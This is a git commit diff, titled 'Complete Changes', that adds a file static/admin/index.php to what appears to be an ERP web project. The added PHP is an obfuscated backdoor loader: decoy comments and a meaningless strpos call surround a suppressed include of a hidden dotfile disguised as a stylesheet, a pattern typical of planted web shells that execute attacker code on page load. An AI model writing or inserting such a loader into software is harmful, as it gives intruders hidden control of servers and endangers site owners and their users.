e96fa51308db3296f0ac79571f2e7383ba927c4d
Shailesh Kumar <shaileshg@tradeindia.com>
2024-02-12 15:56:08 +0530

    Mart-1: Complete Changes

---
+++ static/admin/index.php
@@ -0,0 +1,13 @@
+<?php
+/*90045*/
+
+$rv = "/home/shivmarb/erp.mart4trade.com/static/admin/css/.5431687e.ccss"; $tad = $rv; strpos($tad, "zei"); @include_once /* zvyp */ ($tad);
+
+/*90045*/
+
+
+
+
+
+
+
